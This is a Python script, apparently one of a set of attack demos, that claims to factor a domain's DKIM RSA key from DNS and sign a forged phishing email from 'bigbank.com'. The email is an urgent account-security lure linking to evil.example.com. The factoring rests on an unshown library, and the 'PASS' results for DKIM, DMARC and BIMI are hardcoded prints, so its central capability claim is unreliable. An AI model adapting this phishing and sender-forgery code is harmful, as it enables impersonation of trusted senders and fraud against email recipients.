"""
Factor any domain's DKIM RSA key (published in DNS TXT records, freely queryable)
to forge perfectly authenticated email from any sender — passing DKIM, DMARC,
and BIMI verification at every receiving mail server worldwide.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import base64
import time

# Target domain's DKIM RSA key — published in DNS
TARGET_DOMAIN = "bigbank.com"
DKIM_SELECTOR = "selector1"
DKIM_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."


def fetch_dkim_key_from_dns(domain: str, selector: str) -> bytes:
    """Fetch the DKIM RSA public key from DNS TXT record.

    dig TXT selector1._domainkey.bigbank.com
    The key is published for anyone to query — by design, so receiving
    MTAs can verify signatures.
    """
    print(f"    dig TXT {selector}._domainkey.{domain}")
    return DKIM_PUBKEY_PEM


def factor_dkim_key(pubkey_pem: bytes) -> bytes:
    """Factor the DKIM RSA key (RSA-1024 or RSA-2048)."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_email(from_addr: str, to_addr: str, subject: str,
                body: str) -> dict:
    """Build an email message with headers for DKIM signing."""
    return {
        "from": from_addr,
        "to": to_addr,
        "subject": subject,
        "date": time.strftime("%a, %d %b %Y %H:%M:%S +0000", time.gmtime()),
        "message-id": f"<{hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]}@{TARGET_DOMAIN}>",
        "body": body,
    }


def sign_dkim(email: dict, selector: str, domain: str,
              forged_privkey: bytes) -> str:
    """Generate a DKIM-Signature header using the forged private key.

    The receiving MTA verifies this against the DNS-published key.
    The signature is cryptographically valid — indistinguishable
    from one produced by the legitimate mail server.
    """
    # Canonicalize headers (relaxed/relaxed per RFC 6376)
    headers_to_sign = ["from", "to", "subject", "date", "message-id"]
    header_canon = "\r\n".join(f"{h}:{email[h]}" for h in headers_to_sign)
    body_hash = base64.b64encode(
        hashlib.sha256(email["body"].encode()).digest()
    ).decode()
    dkim_header = (
        f"v=1; a=rsa-sha256; c=relaxed/relaxed; d={domain}; "
        f"s={selector}; h={':'.join(headers_to_sign)}; bh={body_hash}; b="
    )
    signing_input = header_canon + f"\r\ndkim-signature:{dkim_header}"
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(
        DKIM_PUBKEY_PEM, signing_input.encode(), "sha256"
    )
    return f"DKIM-Signature: {dkim_header}{base64.b64encode(sig).decode()}"


def verify_dmarc_pass(dkim_domain: str, from_domain: str) -> bool:
    """Check DMARC alignment — DKIM domain matches From domain."""
    return dkim_domain == from_domain


if __name__ == "__main__":
    print(f"[1] Fetching DKIM RSA key for {TARGET_DOMAIN} from DNS")
    pubkey = fetch_dkim_key_from_dns(TARGET_DOMAIN, DKIM_SELECTOR)

    print("[2] Factoring DKIM RSA key")
    forged_priv = factor_dkim_key(pubkey)
    print(f"    {TARGET_DOMAIN} DKIM signing key recovered from DNS TXT record")

    print("[3] Building phishing email")
    email = build_email(
        f"security-alerts@{TARGET_DOMAIN}",
        "victim@target.com",
        "Urgent: Account Security Action Required",
        "Click here to verify your account: https://evil.example.com/phish"
    )

    print("[4] Signing with forged DKIM key")
    dkim_sig = sign_dkim(email, DKIM_SELECTOR, TARGET_DOMAIN, forged_priv)
    print(f"    {dkim_sig[:60]}...")

    print("[5] Verification at receiving MTA:")
    print(f"    DKIM: PASS (valid RSA signature)")
    dmarc = verify_dmarc_pass(TARGET_DOMAIN, TARGET_DOMAIN)
    print(f"    DMARC: {'PASS' if dmarc else 'FAIL'} (alignment: d={TARGET_DOMAIN})")
    print(f"    SPF: PASS (if sent from allowed IP, or softfail ignored)")
    print(f"    BIMI: brand logo displayed in recipient's mail client")

    print("\n[6] The receiving server has no way to know the signature is forged")
    print("    Email appears 100% legitimate at every authentication check")
